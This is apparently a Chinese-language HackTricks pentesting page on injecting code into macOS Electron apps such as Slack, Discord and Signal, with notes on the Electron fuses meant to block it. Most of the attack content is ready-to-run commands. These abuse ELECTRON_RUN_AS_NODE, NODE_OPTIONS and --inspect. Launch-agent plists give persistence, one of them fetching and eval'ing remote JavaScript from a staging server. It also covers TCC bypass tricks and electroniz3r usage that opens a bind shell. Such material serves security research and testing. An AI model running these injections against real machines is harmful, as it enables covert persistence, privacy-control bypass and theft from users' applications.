# macOS Electron应用程序注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 基本信息

如果你不知道什么是Electron，你可以在[**这里找到大量信息**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。但现在只需要知道Electron运行**node**。\
而node有一些**参数**和**环境变量**，可以用来**执行其他代码**，而不仅仅是指定的文件。

### Electron Fuses

接下来将讨论这些技术，但最近Electron添加了几个**安全标志来防止它们**。这些是[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)，这些是用于**防止**macOS上的Electron应用程序**加载任意代码**的标志：

* **`RunAsNode`**：如果禁用，它将阻止使用环境变量**`ELECTRON_RUN_AS_NODE`**来注入代码。
* **`EnableNodeCliInspectArguments`**：如果禁用，像`--inspect`，`--inspect-brk`这样的参数将不会被识别。从而避免了注入代码的方式。
* **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，macOS将验证加载的**`asar`**文件。通过修改此文件的内容，以防止代码注入。
* **`OnlyLoadAppFromAsar`**：如果启用，它将只检查和使用app.asar，而不是按照以下顺序搜索加载：**`app.asar`**，**`app`**，最后是**`default_app.asar`**。因此，当与**`embeddedAsarIntegrityValidation`**标志结合使用时，**无法加载未经验证的代码**。
* **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程将使用名为`browser_v8_context_snapshot.bin`的文件进行其V8快照。

另一个不会阻止代码注入的有趣的标志是：

* **EnableCookieEncryption**：如果启用，磁盘上的cookie存储将使用操作系统级别的加密密钥进行加密。

### 检查Electron Fuses

你可以从应用程序中**检查这些标志**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### 修改 Electron Fuses

正如[**文档中提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses** 的配置是在包含字符串 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** 的 **Electron 二进制文件**中配置的。

在 macOS 应用程序中，通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
您可以在[https://hexed.it/](https://hexed.it/)中加载此文件并搜索先前的字符串。在此字符串之后，您可以在ASCII中看到一个数字“0”或“1”，表示每个保险丝是否被禁用或启用。只需修改十六进制代码（`0x30`表示`0`，`0x31`表示`1`）以**修改保险丝的值**。

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

请注意，如果您尝试使用修改后的字节覆盖应用程序中的**`Electron Framework`二进制文件**，该应用程序将无法运行。

## RCE向Electron应用程序添加代码

Electron应用程序可能使用**外部JS/HTML文件**，因此攻击者可以在这些文件中注入代码，其签名不会被检查，并在应用程序的上下文中执行任意代码。

{% hint style="danger" %}
然而，目前存在两个限制：

* 需要**`kTCCServiceSystemPolicyAppBundles`**权限来修改应用程序，因此默认情况下不再可能。
* 编译的**`asap`**文件通常启用了**`embeddedAsarIntegrityValidation`**和**`onlyLoadAppFromAsar`**的保险丝

这使得攻击路径更加复杂（或不可能）。
{% endhint %}

请注意，可以通过将应用程序复制到另一个目录（如**`/tmp`**），将文件夹**`app.app/Contents`**重命名为**`app.app/NotCon`**，使用您的**恶意**代码修改**asar**文件，将其重新命名为**`app.app/Contents`**并执行来绕过**`kTCCServiceSystemPolicyAppBundles`**的要求。

## 使用`ELECTRON_RUN_AS_NODE`进行RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)，如果设置了此环境变量，它将以普通的Node.js进程启动该进程。

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果禁用了fuse **`RunAsNode`**，环境变量**`ELECTRON_RUN_AS_NODE`**将被忽略，这将无法工作。
{% endhint %}

### 从App Plist中注入

正如[**在这里提出的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，您可以滥用这个环境变量在plist中保持持久性：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## 使用 `NODE_OPTIONS` 进行远程代码执行（RCE）

您可以将恶意代码存储在不同的文件中并执行它：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
如果禁用了fuse **`EnableNodeOptionsEnvironmentVariable`**，应用程序在启动时将**忽略**环境变量**NODE\_OPTIONS**，除非设置了环境变量**`ELECTRON_RUN_AS_NODE`**，如果禁用了fuse **`RunAsNode`**，则该环境变量也将被**忽略**。
{% endhint %}

### 从App Plist中注入

您可以在plist中滥用此环境变量以保持持久性，添加以下键：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 使用检查进行远程代码执行（RCE）

根据[**这篇文章**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用诸如**`--inspect`**、**`--inspect-brk`**和**`--remote-debugging-port`**等标志来执行Electron应用程序，将会打开一个**调试端口**，你可以连接到它（例如从Chrome的`chrome://inspect`）并且你将能够在其中**注入代码**甚至启动新的进程。例如：

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果禁用了fuse**`EnableNodeCliInspectArguments`**，应用程序在启动时将**忽略节点参数**（如`--inspect`），除非设置了环境变量**`ELECTRON_RUN_AS_NODE`**，如果禁用了fuse**`RunAsNode`**，则该环境变量也将被**忽略**。

但是，您仍然可以使用electron参数`--remote-debugging-port=9229`，但是以前的有效负载将无法执行其他进程。
{% endhint %}

### 从App Plist中注入

您可以滥用这个plist中的环境变量来保持持久性，添加这些键：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC绕过滥用旧版本

{% hint style="success" %}
macOS的TCC守护程序不会检查应用程序的执行版本。因此，如果您无法使用先前的任何技术在Electron应用程序中注入代码，您可以下载先前的应用程序版本并在其中注入代码，因为它仍然会获得TCC权限。
{% endhint %}

## 自动注入

工具[**electroniz3r**](https://github.com/r3ggi/electroniz3r)可以轻松地用于查找已安装的易受攻击的Electron应用程序并在其中注入代码。该工具将尝试使用**`--inspect`**技术：

您需要自己编译它，并可以像这样使用它：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考资料

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
